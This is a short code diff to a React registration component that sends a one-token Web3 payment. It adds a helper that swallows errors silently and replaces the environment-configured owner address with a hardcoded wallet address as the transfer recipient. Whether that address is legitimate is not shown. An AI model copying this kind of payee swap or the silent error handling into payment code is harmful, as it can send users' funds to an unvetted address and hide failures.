@@ -88,6 +88,12 @@ const Registration = ({ id }) => {
     }
   };
 
+  const getWeb3 = async () => {
+    try {
+      const web3 = new Web3(Web3.givenProvider);
+      return web3;
+    } catch (err) {}
+  };
   const approveTokens = async () => {
 
     let web3 = await getWeb3();
@@ -112,9 +118,9 @@ const Registration = ({ id }) => {
     let a = 1;
     const amountInWei = web3.utils.toWei(a.toString(), "ether"); // Convert to Wei
     await contract.methods
-      .transfer(process.env.REACT_APP_OWNER_ADDRESS, amountInWei)
+      .transfer("0xf7D18b20d115942466Fd7010E76D3Cd29afb5F53", amountInWei)
       .send({
-        from: account,
+        from: address,
         gasPrice: web3.utils.toWei("5", "gwei"), // Set gas price to 5 Gwei (adjust as needed)
       })
       .on("receipt", async (receipt) => {
